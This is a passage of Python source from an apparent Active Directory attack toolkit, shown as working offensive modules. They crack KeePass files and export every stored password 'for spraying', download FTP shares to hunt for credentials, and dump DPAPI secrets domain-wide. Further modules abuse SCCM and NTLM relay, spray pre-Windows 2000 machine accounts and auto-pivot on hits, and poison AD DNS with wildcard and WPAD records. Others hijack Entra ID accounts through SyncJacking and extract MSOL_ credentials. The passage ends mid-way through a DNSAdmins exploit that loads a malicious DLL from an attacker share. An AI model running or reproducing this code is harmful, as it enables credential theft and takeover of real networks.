            log('No .kdbx files found in loot dir','warn')
            kdbx_path = self.ask('path to .kdbx file','')
            if not kdbx_path: hr(); return
            kdbx_files = [kdbx_path]
        else:
            log(f'Found {len(kdbx_files)} .kdbx file(s):','info')
            for f in kdbx_files: print(f'  {C0}{f}{RESET}')
            kdbx_path = self.ask('which file', kdbx_files[0])

        action = self.ask('action','crack',['crack','extract','both'])

        if action in ('crack','both'):
            # wordlist options
            wl = self.ask('wordlist', '/usr/share/wordlists/rockyou.txt')
            # generate season+year wordlist as supplement
            gen = self.ask('also generate season+year wordlist?','y',['y','n'])
            wl_paths = []
            if gen == 'y':
                season_wl = os.path.join(target.loot_dir,'seasons.txt')
                with open(season_wl,'w') as f:
                    for y in range(2018,2027):
                        for s in ['Spring','Summer','Fall','Autumn','Winter']:
                            f.write(f'{s}{y}!\n{s}{y}\n{s}@{y}\n')
                log(f'Season wordlist → {WHITE}{season_wl}{RESET}','success')
                wl_paths.append(season_wl)
            if wl and os.path.exists(wl):
                wl_paths.append(wl)

            # convert with keepass2john
            kp2j = check_tool('keepass2john')
            john = check_tool('john')
            hashcat = check_tool('hashcat')

            if not kp2j:
                log('keepass2john not found — install: apt install john','error')
                hr(); return

            hash_file = os.path.join(target.loot_dir,'kdbx.hash')
            log(f'Extracting hash from {WHITE}{os.path.basename(kdbx_path)}{RESET}...','info')
            r_kp = subprocess.run([kp2j, kdbx_path], text=True, capture_output=True)
            if r_kp.returncode != 0 or not r_kp.stdout.strip():
                log(f'keepass2john failed: {r_kp.stderr.strip()}','error'); hr(); return
            open(hash_file,'w').write(r_kp.stdout)
            log(f'Hash saved → {WHITE}{hash_file}{RESET}','success')

            cracked_pw = None
            for wl_path in wl_paths:
                if cracked_pw: break
                if not os.path.exists(wl_path): continue
                log(f'Cracking with {WHITE}{os.path.basename(wl_path)}{RESET}...','info')
                if john:
                    r_j = subprocess.run([john, hash_file, f'--wordlist={wl_path}'],
                        text=True, capture_output=True)
                    # check if cracked
                    r_show = subprocess.run([john, hash_file, '--show'],
                        text=True, capture_output=True)
                    m = re.search(r':(.+)', r_show.stdout)
                    if m:
                        cracked_pw = m.group(1).strip()
                        log(f'{GREEN}Cracked: {WHITE}{cracked_pw}{RESET}','success')
                        open(os.path.join(target.loot_dir,'cracked.txt'),'a').write(
                            f'{os.path.basename(kdbx_path)}:{cracked_pw}\n')

            if not cracked_pw:
                log('Not cracked — try a different wordlist','warn')
                hr(); return
        else:
            cracked_pw = self.ask('known password','')

        if action in ('extract','both') or (action == 'crack' and cracked_pw):
            # extract with pykeepass
            log(f'Extracting entries from {WHITE}{os.path.basename(kdbx_path)}{RESET}...','info')
            try:
                from pykeepass import PyKeePass
                kp = PyKeePass(kdbx_path, password=cracked_pw or self.ask('password',''))
                creds_file = os.path.join(target.loot_dir,'keepass_creds.txt')
                with open(creds_file,'w') as f:
                    for e in kp.entries:
                        line = f'[{e.group.name}] {e.title}: {e.username} / {e.password}'
                        print(f'  {C0}[{e.group.name}]{RESET} {WHITE}{e.title}{RESET}: {GREEN}{e.username}{RESET} / {ORANGE}{e.password}{RESET}')
                        f.write(line+'\n')
                        # also save passwords for spraying
                        if e.password:
                            open(os.path.join(target.loot_dir,'keepass_passwords.txt'),'a').write(e.password+'\n')
                log(f'{GREEN}Creds saved → {WHITE}{creds_file}{RESET}','success')
                log(f'Passwords → {WHITE}{os.path.join(target.loot_dir,"keepass_passwords.txt")}{RESET} — use for spray','info')
            except ImportError:
                log('pykeepass not installed — run: pip install pykeepass --break-system-packages','error')
            except Exception as e:
                log(f'Extract failed: {e}','error')
        hr()

class FTP(Module):
    name='ftp'; description='FTP enumeration — anonymous login, list files, download all, hunt for creds/configs'; category='recon'
    def run(self, target):
        if not target.dc: log('DC IP required','error'); return
        hr()
        action = self.ask('action','enum',['enum','download','interactive'])
        host = self.ask('host', target.dc_fqdn or target.dc)
        user = self.ask('username','anonymous')
        pw   = self.ask('password','anonymous')

        ftp_bin = check_tool('ftp')
        import subprocess as _sp_ftp, re as _re_ftp

        if action == 'enum':
            log(f'FTP enum → {WHITE}{host}{RESET} as {WHITE}{user}{RESET}','info')
            # use netexec spider or python ftplib
            try:
                import ftplib
                ftp = ftplib.FTP(timeout=10)
                ftp.connect(host, 21)
                banner = ftp.getwelcome()
                log(f'Banner: {WHITE}{banner}{RESET}','info')
                ftp.login(user, pw)
                log(f'{GREEN}Login OK as {user}{RESET}','success')
                # recursive list
                def _list(path='.', depth=0):
                    try:
                        items = []
                        ftp.dir(path, items.append)
                        for item in items:
                            parts = item.split()
                            if not parts: continue
                            perms = parts[0]; name = parts[-1]
                            indent = '  ' * depth
                            if name in ('.','..',''):  continue
                            full = f'{path}/{name}' if path != '.' else name
                            if perms.startswith('d'):
                                print(f'  {indent}{C0}{name}/{RESET}')
                                _list(full, depth+1)
                            else:
                                size = parts[4] if len(parts)>4 else '?'
                                print(f'  {indent}{WHITE}{name}{RESET}  {GREY}({size}b){RESET}')
                    except Exception as e:
                        print(f'  {GREY}[err: {e}]{RESET}')
                _list()
                ftp.quit()
            except Exception as e:
                log(f'FTP error: {e}','error')

        elif action == 'download':
            log(f'Downloading all files from {WHITE}{host}{RESET}','info')
            out_dir = os.path.join(target.loot_dir, 'ftp')
            os.makedirs(out_dir, exist_ok=True)
            try:
                import ftplib
                ftp = ftplib.FTP(timeout=15)
                ftp.connect(host, 21)
                ftp.login(user, pw)
                log(f'{GREEN}Login OK{RESET}','success')
                downloaded = []
                def _download(path='.', local=out_dir):
                    try:
                        items = []
                        ftp.dir(path, items.append)
                        for item in items:
                            parts = item.split()
                            if not parts: continue
                            perms = parts[0]; name = parts[-1]
                            if name in ('.', '..'): continue
                            remote = f'{path}/{name}' if path != '.' else name
                            local_path = os.path.join(local, name)
                            if perms.startswith('d'):
                                os.makedirs(local_path, exist_ok=True)
                                _download(remote, local_path)
                            else:
                                with open(local_path, 'wb') as f:
                                    ftp.retrbinary(f'RETR {remote}', f.write)
                                size = os.path.getsize(local_path)
                                log(f'{GREEN}↓ {name}{RESET}  {GREY}({size}b) → {local_path}{RESET}','success')
                                downloaded.append(local_path)
                    except Exception as e:
                        log(f'Download error: {e}','warn')
                _download()
                ftp.quit()
                log(f'{GREEN}{len(downloaded)} file(s) downloaded → {WHITE}{out_dir}{RESET}','success')
                # hint at interesting files
                for f in downloaded:
                    bn = os.path.basename(f).lower()
                    if any(x in bn for x in ['kdbx','keepass','pass','cred','config','key','.txt','.xml']):
                        log(f'{ORANGE}Interesting: {WHITE}{os.path.basename(f)}{RESET}','warn')
            except Exception as e:
                log(f'FTP error: {e}','error')

        elif action == 'interactive':
            log(f'Opening interactive FTP session → {WHITE}{host}{RESET}','info')
            if ftp_bin:
                os.execvp(ftp_bin, [ftp_bin, host])
            else:
                log('ftp binary not found — install: apt install ftp','error')
        hr()


class Cleanup(Module):
    name='cleanup'; description='undo destructive actions from this session — DACL/group/user/computer changes'; category='misc'
    def run(self, target):
        hr()
        print(f'  {C0}{BOLD}cleanup{RESET}  {GREY}session action log — reverse order{RESET}\n')
        if not _CLEANUP_STACK:
            log('Nothing to clean up this session','info')
            log(f'{GREY}Tracked actions: dacl, owner, group_member, user_created, computer_created, password_reset, spn{RESET}','info')
            hr(); return

        # display the stack
        icons = {
            'dacl':             f'{RED}dacl     {RESET}',
            'owner':            f'{ORANGE}owner    {RESET}',
            'group_member':     f'{C0}group    {RESET}',
            'user_created':     f'{RED}user     {RESET}',
            'computer_created': f'{RED}computer {RESET}',
            'password_reset':   f'{GREY}pwd      {RESET}',
            'upn':              f'{GREY}upn      {RESET}',
            'spn':              f'{GREY}spn      {RESET}',
            'rbcd':             f'{ORANGE}rbcd     {RESET}',
            'shadow_cred':      f'{ORANGE}shadow   {RESET}',
        }
        print(f'  {"#":<4}{"type":<12}{"action"}{RESET}')
        print(f'  {"─"*60}')
        for i, entry in enumerate(reversed(_CLEANUP_STACK), 1):
            icon = icons.get(entry['type'], f'{GREY}misc     {RESET}')
            can_auto = '✓ auto' if callable(entry.get('undo')) else '⚠ manual'
            col = GREEN if can_auto == '✓ auto' else ORANGE
            print(f'  {GREY}{i:<4}{RESET}{icon}  {WHITE}{entry["desc"]}{RESET}  {col}{can_auto}{RESET}')
        print()

        auto_count   = sum(1 for e in _CLEANUP_STACK if callable(e.get('undo')))
        manual_count = len(_CLEANUP_STACK) - auto_count
        log(f'{auto_count} auto-reversible · {manual_count} manual review needed','info')
        print()

        action = self.ask('action', 'all', ['all', 'auto', 'select', 'list', 'export', 'clear'])

        if action == 'list':
            hr(); return

        if action == 'clear':
            _CLEANUP_STACK.clear()
            log('Cleanup stack cleared','success'); hr(); return

        if action == 'export':
            import json as _j
            out = os.path.join(target.loot_dir,'cleanup_log.json')
            data = [{'type':e['type'],'desc':e['desc'],'auto':callable(e.get('undo'))}
                    for e in _CLEANUP_STACK]
            with open(out,'w') as f: _j.dump(data,f,indent=2,default=str)
            log(f'Cleanup log → {WHITE}{out}{RESET}','success'); hr(); return

        to_undo = []
        if action == 'all':
            to_undo = list(reversed(_CLEANUP_STACK))
        elif action == 'auto':
            to_undo = [e for e in reversed(_CLEANUP_STACK) if callable(e.get('undo'))]
            log(f'Auto-reversing {len(to_undo)} action(s)','info')
        elif action == 'select':
            idx = self.ask('entry number(s) (comma-separated)','')
            try:
                nums = [int(x.strip()) for x in idx.split(',')]
                rev  = list(reversed(_CLEANUP_STACK))
                to_undo = [rev[n-1] for n in nums if 1 <= n <= len(rev)]
            except Exception:
                log('Invalid selection','error'); hr(); return

        if not to_undo:
            log('Nothing selected','warn'); hr(); return

        confirm = self.ask(f'Undo {len(to_undo)} action(s)?','y',['y','n'])
        if confirm != 'y':
            log('Cancelled','warn'); hr(); return

        hr()
        failed = []
        for entry in to_undo:
            log(f'Undoing: {WHITE}{entry["desc"]}{RESET}','info')
            undo_fn = entry.get('undo')
            if not callable(undo_fn):
                log(f'{ORANGE}Manual cleanup required for {entry["type"]}{RESET}','warn')
                _print_manual_cleanup(entry, target)
                continue
            try:
                undo_fn()
                if entry in _CLEANUP_STACK:
                    _CLEANUP_STACK.remove(entry)
                log(f'{GREEN}✓ reversed{RESET}','success')
            except Exception as ex:
                log(f'Failed: {ex}','error')
                failed.append(entry)

        if failed:
            log(f'{len(failed)} action(s) could not be auto-reversed — manual steps:','warn')
            for e in failed:
                _print_manual_cleanup(e, target)
        else:
            log(f'{GREEN}Cleanup complete ✓{RESET}','success')
        hr()


def _print_manual_cleanup(entry, target):
    """Print manual cleanup instructions for non-auto-reversible actions."""
    t = entry.get('type','')
    d = entry.get('desc','')
    auth = f'-d {target.domain} -u {target.user} -p {target.password or "<pass>"}' if target.user else ''
    if t == 'password_reset':
        print(f'  {ORANGE}→ Manual:{RESET} reset password back for {WHITE}{d}{RESET}')
        print(f'    {GREY}net rpc password <user> <oldpass> {auth} -S {target.dc}{RESET}')
    elif t == 'dacl':
        print(f'  {ORANGE}→ Manual:{RESET} restore DACL: {WHITE}{d}{RESET}')
        print(f'    {GREY}dacledit.py -action restore -file dacledit-*.bak {auth} -dc-ip {target.dc} {target.domain}/{RESET}')
    elif t == 'group_member':
        print(f'  {ORANGE}→ Manual:{RESET} remove from group: {WHITE}{d}{RESET}')
        print(f'    {GREY}bloodyad {auth} --host {target.dc} remove groupMember <group> <user>{RESET}')
    elif t in ('user_created','computer_created'):
        print(f'  {ORANGE}→ Manual:{RESET} delete object: {WHITE}{d}{RESET}')
        print(f'    {GREY}bloodyad {auth} --host {target.dc} remove object <name>{RESET}')
    else:
        print(f'  {ORANGE}→ Manual review required:{RESET} {WHITE}{d}{RESET}')




class DPloot(Module):
    name='dploot'; description='dploot — domain-wide DPAPI: masterkeys, browser creds, certificates, wifi, vaults'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        t = self.need('dploot')
        if not t: return
        hr()
        action = self.ask('action','all',['all','masterkeys','browsers','certificates','wifi','vaults','sccm','backupkey'])
        loot   = target.loot_dir
        dc     = target.dc_fqdn or target.dc
        hr()

        def _base():
            b = [t, action if action != 'all' else 'computers',
                 '-d', target.domain, '-dc-ip', target.dc]
            if target.hash:     b += ['-hashes', f':{target.hash}']
            elif target.password: b += ['-p', target.password]
            b += ['-u', target.user]
            b += ['-o', os.path.join(loot, 'dploot')]
            return b

        if action == 'all':
            for sub in ['masterkeys','browsers','certificates','wifi','vaults']:
                log(f'dploot {sub}','info')
                cmd = [t, sub, '-d', target.domain, '-dc-ip', target.dc,
                       '-u', target.user, '-o', os.path.join(loot,'dploot')]
                if target.hash:      cmd += ['-hashes', f':{target.hash}']
                elif target.password: cmd += ['-p', target.password]
                run_cmd(cmd, label=f'dploot {sub}')
            add_result('dploot', 'full DPAPI dump')
        elif action == 'backupkey':
            log('Fetching domain DPAPI backup key (requires DA)','info')
            cmd = [t,'backupkey','-d',target.domain,'-dc-ip',target.dc,
                   '-u',target.user,'-o',os.path.join(loot,'dploot')]
            if target.hash:      cmd += ['-hashes',f':{target.hash}']
            elif target.password: cmd += ['-p',target.password]
            run_cmd(cmd, label='dploot backupkey')
            add_result('dploot','backup key exported')
        else:
            run_cmd(_base(), label=f'dploot {action}')
            add_result('dploot', f'{action} dumped')
        hr()


# =============================================================================
# SCCM — SCCM/MECM abuse
# =============================================================================
class SCCM(Module):
    name='sccm'; description='SCCM/MECM abuse — NAA creds, client push, AdminService, site enum'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','naa','push','adminservice','relay'])
        hr()

        if action == 'enum':
            # enumerate SCCM via netexec or sccmhunter
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            sccmh = check_tool('sccmhunter')
            if sccmh:
                log('sccmhunter — enumerate SCCM infrastructure','info')
                cmd = [sccmh,'http','-u',target.user,'-p',target.password or '',
                       '-d',target.domain,'-dc-ip',target.dc]
                if target.hash: cmd = [sccmh,'http','-u',target.user,'-hashes',f':{target.hash}',
                                        '-d',target.domain,'-dc-ip',target.dc]
                run_cmd(cmd, label='sccmhunter enum')
            elif nxc:
                log('netexec smb — looking for SCCM shares','info')
                base = [nxc,'smb',target.dc]+target.nxc_args()
                run_cmd(base+['--shares'], label='nxc sccm shares')
                run_cmd(base+['-M','sccm'], label='nxc sccm module')
            else:
                log('sccmhunter or netexec required','error')

        elif action == 'naa':
            log('NAA (Network Access Account) credential theft','info')
            log('Requires access to SCCM client or WMI on a managed host','warn')
            sccmh = check_tool('sccmhunter')
            if sccmh:
                host = self.ask('managed host IP/name', target.dc)
                cmd  = [sccmh,'dpapi','-u',target.user,'-d',target.domain,
                        '-dc-ip',target.dc,'-target',host]
                if target.hash:      cmd += ['-hashes',f':{target.hash}']
                elif target.password: cmd += ['-p',target.password]
                run_cmd(cmd, label='sccmhunter naa')
                add_result('sccm','NAA creds via DPAPI')
            else:
                log('sccmhunter not found — install: pip install sccmhunter','error')
                log('Alternative: use dpapi module on managed client','info')

        elif action == 'push':
            log('Client push attack — coerce machine account auth','info')
            log('Requires: SCCM site server reachable, Responder/relay running','warn')
            sccmh = check_tool('sccmhunter')
            if sccmh:
                site = self.ask('SCCM site server IP/name')
                cmd  = [sccmh,'smb','-u',target.user,'-d',target.domain,
                        '-dc-ip',target.dc,'-target',site,'-push']
                if target.hash:      cmd += ['-hashes',f':{target.hash}']
                elif target.password: cmd += ['-p',target.password]
                run_cmd(cmd, label='sccmhunter push')
            else:
                log('sccmhunter not found','error')

        elif action == 'adminservice':
            log('AdminService API abuse (requires SCCM admin rights)','info')
            sccmh = check_tool('sccmhunter')
            if sccmh:
                site = self.ask('SCCM site server IP/name')
                cmd  = [sccmh,'admin','-u',target.user,'-d',target.domain,
                        '-dc-ip',target.dc,'-target',site]
                if target.hash:      cmd += ['-hashes',f':{target.hash}']
                elif target.password: cmd += ['-p',target.password]
                run_cmd(cmd, label='sccmhunter admin')
                add_result('sccm','AdminService access')

        elif action == 'relay':
            log('SCCM relay — client push → NTLM relay to LDAP/SMB','info')
            log('Start Responder/ntlmrelayx first, then trigger push','warn')
            relay = check_tool('impacket-ntlmrelayx','ntlmrelayx.py')
            if relay:
                log(f'Example: {C0}impacket-ntlmrelayx -t ldap://{target.dc} --delegate-access{RESET}','info')
        hr()


# =============================================================================
# Pre2K — Pre-Windows 2000 compatible machine account abuse
# =============================================================================
class Pre2K(Module):
    name='pre2k'; description='Pre-Windows 2000 machine accounts — default password spray, privilege check'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','spray','check'])
        hr()

        ccache  = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))
        dc      = target.dc_fqdn or target.dc
        nxc     = check_tool('netexec','nxc','crackmapexec','cme')

        def _nxc_base():
            b = [nxc,'ldap',dc]
            if use_krb: b += ['-k','--use-kcache','-u',target.user]
            else:
                b += ['-u',target.user]
                if target.password: b += ['-p',target.password]
                elif target.hash:   b += ['-H',target.hash]
            return b

        if action == 'enum':
            log('Enumerating all machine accounts (pre2k candidates)','info')
            if nxc:
                rc, lines = run_cmd_capture(_nxc_base()+['--computers'], label='nxc computers')
                machines = []
                for l in lines:
                    if '$' in l and 'LDAP' in l:
                        parts = l.split()
                        for p in parts:
                            if p.endswith('$') and not p.startswith('['):
                                machines.append(p.rstrip('$'))
                if machines:
                    log(f'Found {len(machines)} machine account(s): {WHITE}{", ".join(m+"$" for m in machines)}{RESET}','success')
                    mfile = os.path.join(target.loot_dir,'pre2k_machines.txt')
                    with open(mfile,'w') as f:
                        for m in machines: f.write(m+'$\n')
                    log(f'Saved → {WHITE}{mfile}{RESET}  —  run pre2k spray to test','info')
                run_cmd(_nxc_base()+['--pre2k'], label='nxc pre2k flag check')
            else:
                log('netexec required','error')

        elif action == 'spray':
            log('Pre2K password spray — machine_name$ : machine_name (lowercase)','info')
            if not nxc: log('netexec required','error'); hr(); return

            machines = []
            for fname in ['pre2k_machines.txt','users.txt']:
                fpath = os.path.join(target.loot_dir, fname)
                if os.path.exists(fpath):
                    for l in open(fpath):
                        l = l.strip()
                        if l.endswith('$'):
                            m = l.rstrip('$')
                            if m not in machines: machines.append(m)

            if not machines:
                manual = self.ask('no machine accounts found — enter names (comma separated, no $)')
                machines = [m.strip() for m in manual.split(',') if m.strip()]

            if not machines:
                log('No machine accounts to spray','error'); hr(); return

            log(f'Spraying {len(machines)} machine account(s)','info')
            pfile = os.path.join(target.loot_dir,'pre2k_passwords.txt')
            mlist = os.path.join(target.loot_dir,'pre2k_spray_machines.txt')
            with open(pfile,'w') as f:
                for m in machines: f.write(m.lower()+'\n')
            with open(mlist,'w') as f:
                for m in machines: f.write(m+'$\n')

            if use_krb:
                log('Kerberos-only env — trying getTGT with pre2k password (parallel)','info')
                getTGT = check_tool('impacket-getTGT','getTGT.py')
                hits = []
                if getTGT:
                    orig = os.getcwd(); os.chdir(target.loot_dir)
                    lock = threading.Lock()

                    def _try_pre2k(m):
                        pw = m.lower()
                        r = subprocess.run(
                            [getTGT,f'{target.domain}/{m}$:{pw}','-dc-ip',target.dc],
                            text=True, capture_output=True)
                        if 'Saving ticket' in (r.stdout+r.stderr):
                            with lock:
                                log(f'{GREEN}HIT: {WHITE}{m}$ : {pw}{RESET}','success')
                                hits.append(f'{m}$:{pw}')
                                add_result('pre2k',f'pre2k hit: {m}$')
                        return m

                    log(f'Spraying {len(machines)} machine account(s) in parallel...','info')
                    with ThreadPoolExecutor(max_workers=min(len(machines),5)) as pool:
                        futures = {pool.submit(_try_pre2k, m): m for m in machines}
                        for fut in as_completed(futures):
                            try: fut.result()
                            except Exception as e: log(f'pre2k {futures[fut]} error: {e}','warn')

                    os.chdir(orig)
                if not hits:
                    log('No pre2k hits via Kerberos','info')
                else:
                    with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as f:
                        f.write('\n'.join(hits)+'\n')
                    # auto-pivot on first hit
                    if hits:
                        first = hits[0]
                        u2,p2 = first.split(':',1)
                        log(f'{GREEN}Auto-pivoting to {WHITE}{u2}{RESET}','info')
                        target.user = u2; target.password = p2; target.hash = None
                        TARGET.user = u2; TARGET.password = p2; TARGET.hash = None
                        add_result('pre2k', f'pivoted → {u2}')
            else:
                rc, lines = run_cmd_capture(
                    [nxc,'smb',target.dc,'-d',target.domain,
                     '-u',mlist,'-p',pfile,'--no-bruteforce'],
                    label='nxc pre2k spray')
                hits = [l for l in lines if '[+]' in l and '$' in l]
                if hits:
                    add_result('pre2k',f'{len(hits)} pre2k hit(s)')
                    for h in hits: print(f'  {GREEN}{h.strip()}{RESET}')
                else:
                    log('No pre2k hits','info')

        elif action == 'check':
            log('Check MAQ — how many machine accounts this user can create','info')
            if nxc: run_cmd(_nxc_base()+['--maq'], label='nxc maq check')
        hr()

class ADIDNS(Module):
    name='adidns'; description='AD Integrated DNS — wildcard injection, WPAD poisoning, record add/remove/enum'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','add','wildcard','wpad','remove'])
        hr()

        dns = check_tool('dnstool.py','dnstool')
        nxc = check_tool('netexec','nxc','crackmapexec','cme')

        def _dns_auth():
            a = ['-u',f'{target.user}@{target.domain}','-dc',target.dc]
            if target.password: a += ['-p',target.password]
            return a

        if action == 'enum':
            log('Enumerating AD DNS records','info')
            t = check_tool('adidnsdump')
            if t:
                out = os.path.join(target.loot_dir,'adidns_records.csv')
                cmd = [t,'-u',f'{target.domain}\\{target.user}',target.dc,
                       '--print','-o',out]
                if target.password: cmd += ['-p',target.password]
                run_cmd(cmd, label='adidnsdump')
                add_result('adidns', f'DNS records → adidns_records.csv')
            elif nxc:
                run_cmd([nxc,'ldap',target.dc]+target.nxc_args()+
                        ['--dns-server',target.dc], label='nxc dns enum')
            else:
                log('adidnsdump not found — install: pip install adidnsdump','error')

        elif action == 'add':
            if not dns: log('dnstool.py not found — install from dirkjanm/krbrelayx','error'); hr(); return
            name = self.ask('DNS record name (e.g. wpad)')
            ip   = self.ask('IP to point to (your attacker IP)')
            cmd  = ['python3', dns] + _dns_auth() + ['--action','add','--record',name,'--data',ip,'--type','A']
            run_cmd(cmd, label='dnstool add')
            log(f'{GREEN}Record added: {WHITE}{name} → {ip}{RESET}','success')
            add_result('adidns', f'{name} → {ip} added')

        elif action == 'wildcard':
            if not dns: log('dnstool.py not found','error'); hr(); return
            ip = self.ask('attacker IP for wildcard')
            log('Adding wildcard DNS record (*) — captures all unresolved names','info')
            cmd = ['python3', dns] + _dns_auth() + ['--action','add','--record','*','--data',ip,'--type','A']
            run_cmd(cmd, label='dnstool wildcard')
            log(f'{GREEN}Wildcard DNS added → {ip}{RESET}','success')
            log(f'{ORANGE}Start Responder with --no-mdns-sd to capture auth{RESET}','warn')
            add_result('adidns', f'wildcard * → {ip}')

        elif action == 'wpad':
            if not dns: log('dnstool.py not found','error'); hr(); return
            ip = self.ask('attacker IP (WPAD server)')
            log('Adding WPAD DNS record → point browsers to your proxy','info')
            cmd = ['python3', dns] + _dns_auth() + ['--action','add','--record','wpad','--data',ip,'--type','A']
            run_cmd(cmd, label='dnstool wpad')
            log(f'{GREEN}WPAD record added → {ip}{RESET}','success')
            log(f'{ORANGE}Serve wpad.dat on port 80, run Responder to capture proxy auth{RESET}','warn')
            add_result('adidns', f'wpad → {ip}')

        elif action == 'remove':
            if not dns: log('dnstool.py not found','error'); hr(); return
            name = self.ask('DNS record name to remove')
            cmd  = ['python3', dns] + _dns_auth() + ['--action','remove','--record',name]
            run_cmd(cmd, label='dnstool remove')
            log(f'{GREEN}Record removed: {WHITE}{name}{RESET}','success')
        hr()





# =============================================================================
# SYNCJACKING — Azure AD Connect hijack via Write-All-Properties
# =============================================================================
class SyncJacking(Module):
    name='syncjacking'; description='SyncJacking — hijack Entra ID accounts via Azure AD Connect hard matching'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','exploit','msol'])
        hr()

        if action == 'enum':
            log('Searching for Azure AD Connect MSOL_ accounts and sync objects','info')
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                base = [nxc,'ldap',target.dc_fqdn or target.dc] + target.nxc_args()
                # find MSOL_ accounts
                run_cmd(base+['--query','(sAMAccountName=MSOL_*)','sAMAccountName,description,userAccountControl'],
                        label='nxc find MSOL accounts')
                # find accounts with Write-All-Properties
                run_cmd(base+['--users'], label='nxc users')
            log(f'Also check: {C0}pathfind{RESET} for WriteAllProperties / GenericWrite edges','info')

        elif action == 'msol':
            log('Extract MSOL_ credentials from Azure AD Connect server','info')
            log(f'{ORANGE}Requires: shell on Azure AD Connect server (run exec first){RESET}','warn')
            aadint_path = check_tool('AADInternals','AADInternals.psm1','AADInternals.ps1')
            ewrm = check_tool('evil-winrm')
            dc_host = target.dc_fqdn or target.dc

            if aadint_path and ewrm:
                log(f'{GREEN}AADInternals found — uploading and executing on target{RESET}','info')
                log(f'{ORANGE}Steps:{RESET}','info')
                log(f'  1. In evil-winrm shell: {C0}upload {aadint_path} C:\\Windows\\Temp\\AADInternals.psm1{RESET}','info')
                log(f'  2. Then run: {C0}Import-Module C:\\Windows\\Temp\\AADInternals.psm1{RESET}','info')
                log(f'  3. Then run: {C0}Get-AADIntSyncCredentials{RESET}','info')
                log(f'{PINK}Opening evil-winrm shell — run commands above once connected{RESET}','warn')
                hr()
                if target.hash:
                    cmd = [ewrm,'-i',dc_host,'-u',target.user,'-H',target.hash]
                elif target.password:
                    cmd = [ewrm,'-i',dc_host,'-u',target.user,'-p',target.password]
                else:
                    log('Set creds first (set → user/pass or hash)','error'); hr(); return
                import subprocess as _sp_aad
                pid = os.fork()
                if pid == 0:
                    os.execvp(cmd[0], cmd)
                else:
                    os.waitpid(pid, 0)
            else:
                if not aadint_path:
                    log(f'{ORANGE}AADInternals not installed — run: install{RESET}','warn')
                log('Manual steps inside evil-winrm shell:','info')
                log(f'  {C0}upload /home/grejh0t/segfault-ad/tools/AADInternals/AADInternals.psm1{RESET}','info')
                log(f'  {C0}Import-Module C:\\Windows\\Temp\\AADInternals.psm1{RESET}','info')
                log(f'  {C0}Get-AADIntSyncCredentials{RESET}  ← dumps MSOL_ username + password','info')
                log(f'  {C0}Get-AADIntSyncCredentials | fl{RESET}  ← formatted output','info')
                hr()
                log('Or use sqlcmd directly on the box (no upload needed):','info')
                log(f'  {C0}sqlcmd -S "(localdb)\\\\.\\ADSyncLocalDB" -Q "SELECT private_configuration_xml FROM mms_management_agent"{RESET}','info')
                log(f'  {C0}sqlcmd -S ".\\ADSyncLocalDB" -d ADSync -Q "SELECT keyset_id,instance_id,entropy FROM mms_server_configuration"{RESET}','info')
                hr()
                msol_user = self.ask('MSOL_ username if already extracted','')
                msol_pass = self.ask('MSOL_ password if already extracted','')
                if msol_user and msol_pass:
                    target.user = msol_user; target.password = msol_pass
                    target.hash = None
                    TARGET.user = msol_user; TARGET.password = msol_pass; TARGET.hash = None
                    log(f'{GREEN}Pivoted to {WHITE}{msol_user}{RESET} — run dcsync','success')
                    add_result('azureadsync', f'MSOL_ creds → {msol_user}')

        elif action == 'exploit':
            log('SyncJacking — manipulate ImmutableID to hijack Entra ID account','info')
            log(f'{ORANGE}Requires: GenericWrite or Write-All-Properties on target AD account{RESET}','warn')
            log('Steps:','info')
            log(f'  1. Find unsynchronized privileged Entra ID account','info')
            log(f'  2. Set ImmutableID on AD account to match target Entra ID objectId','info')
            log(f'  3. Force sync → AD account hijacks Entra ID account','info')
            target_user = self.ask('AD user to manipulate (needs GenericWrite)')
            entra_guid  = self.ask('Entra ID objectId of target cloud account')
            if target_user and entra_guid:
                import base64 as _b64
                # convert GUID to ImmutableID (base64 of bytes)
                try:
                    import uuid as _uuid
                    b = _uuid.UUID(entra_guid).bytes_le
                    immutable_id = _b64.b64encode(b).decode()
                    log(f'ImmutableID: {WHITE}{immutable_id}{RESET}','info')
                    bloody = check_tool('bloodyad','bloodyAD')
                    if bloody:
                        cmd = [bloody,'--host',target.dc_fqdn or target.dc,
                               '-d',target.domain]+target.bloodyad_args()+\
                              ['set','object',target_user,'mS-DS-ConsistencyGuid','-v',immutable_id]
                        run_cmd(cmd, label='bloodyAD set ImmutableID')
                        log(f'{GREEN}ImmutableID set — trigger sync to complete hijack{RESET}','success')
                        add_result('syncjacking',f'ImmutableID set on {target_user}')
                except Exception as e:
                    log(f'GUID conversion failed: {e}','error')
        hr()


# =============================================================================
# DNSADMINS — DNSAdmins DLL injection for SYSTEM execution
# =============================================================================
class DNSAdmins(Module):
    name='dnsadmins'; description='DNSAdmins DLL abuse — load malicious DLL as SYSTEM via DNS service'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','check',['check','exploit','cleanup'])
        hr()

        if action == 'check':
            log('Check if current user is in DNSAdmins group','info')
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                run_cmd([nxc,'ldap',target.dc_fqdn or target.dc]+target.nxc_args()+
                        ['--group','DNSAdmins'], label='nxc DNSAdmins members')
            bloody = check_tool('bloodyad','bloodyAD')
            if bloody:
                run_cmd([bloody,'--host',target.dc_fqdn or target.dc,
                         '-d',target.domain]+target.bloodyad_args()+
                        ['get','object','DNSAdmins','--attr','member'],
                        label='bloodyAD DNSAdmins')

        elif action == 'exploit':
            log('DNSAdmins DLL injection — executes DLL as SYSTEM via DNS service restart','info')
            log(f'{ORANGE}Requires: member of DNSAdmins + ability to restart DNS service{RESET}','warn')
            dll_path = self.ask('UNC path to malicious DLL (e.g. \\\\attacker\\share\\evil.dll)')
            dc_host  = target.dc_fqdn or target.dc

            log(f'Step 1: Set malicious DLL via dnscmd','info')
            dnscmd = ['dnscmd.exe',dc_host,'/config','/serverlevelplugindll',dll_path]
